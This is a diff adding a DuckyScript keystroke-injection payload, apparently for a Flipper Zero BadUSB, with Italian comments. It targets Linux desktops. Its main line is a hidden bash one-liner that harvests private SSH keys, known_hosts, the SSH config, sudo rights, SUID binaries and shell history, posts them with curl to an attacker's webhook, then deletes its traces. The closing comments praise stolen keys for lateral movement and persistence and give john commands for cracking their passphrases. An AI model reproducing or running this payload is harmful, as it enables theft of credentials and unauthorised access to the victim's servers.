@@ -1,0 +1,35 @@
+REM ============================================================
+REM Title:    SSH Key Exfiltration + System Recon
+REM Target:   Linux (qualsiasi distro)
+REM Author:   FlipperZero-guide
+REM Category: Exfiltration / Recon
+REM Privs:    User (no root)
+REM Layout:   US
+REM Time:     ~8 secondi
+REM Detect:   Basso - lettura file locali
+REM Desc:     Raccoglie chiavi SSH, known_hosts, bash history,
+REM           info sistema e rete. Invia tutto ad un webhook.
+REM CHANGE:   WEBHOOK_URL
+REM ============================================================
+
+DELAY 2000
+CTRL ALT t
+DELAY 1500
+
+STRING bash -c 'D=$(mktemp -d);echo "=== LINUX RECON ===" > $D/out;echo "Date: $(date)" >> $D/out;echo "Hostname: $(hostname)" >> $D/out;echo "User: $(whoami)" >> $D/out;echo "OS: $(cat /etc/os-release 2>/dev/null | head -3)" >> $D/out;echo "=== NETWORK ===" >> $D/out;ip a >> $D/out 2>/dev/null || ifconfig >> $D/out;echo "=== SSH KEYS ===" >> $D/out;ls -la ~/.ssh/ >> $D/out 2>/dev/null;cat ~/.ssh/id_rsa >> $D/out 2>/dev/null;cat ~/.ssh/id_ed25519 >> $D/out 2>/dev/null;echo "=== KNOWN HOSTS ===" >> $D/out;cat ~/.ssh/known_hosts >> $D/out 2>/dev/null;echo "=== SSH CONFIG ===" >> $D/out;cat ~/.ssh/config >> $D/out 2>/dev/null;echo "=== SUDO CHECK ===" >> $D/out;sudo -l 2>/dev/null >> $D/out;echo "=== CRONTAB ===" >> $D/out;crontab -l >> $D/out 2>/dev/null;echo "=== SUID ===" >> $D/out;find / -perm -4000 -type f 2>/dev/null | head -20 >> $D/out;echo "=== HISTORY ===" >> $D/out;tail -50 ~/.bash_history >> $D/out 2>/dev/null;tail -50 ~/.zsh_history >> $D/out 2>/dev/null;curl -s -X POST -H "Content-Type: application/json" -d "{\"content\":\"$(cat $D/out | head -100 | sed "s/\"/\\\\\"/g")\"}" "WEBHOOK_URL";rm -rf $D' &>/dev/null &
+ENTER
+DELAY 500
+STRING exit
+ENTER
+
+REM ============================================================
+REM NOTA: Le chiavi SSH private sono il target più prezioso
+REM su un sistema Linux. Una chiave SSH compromessa permette:
+REM - Accesso a tutti i server in known_hosts
+REM - Lateral movement senza password
+REM - Persistenza difficile da rilevare
+REM
+REM Se la chiave ha passphrase, serve crack offline:
+REM   ssh2john id_rsa > hash.txt
+REM   john hash.txt --wordlist=rockyou.txt
+REM ============================================================
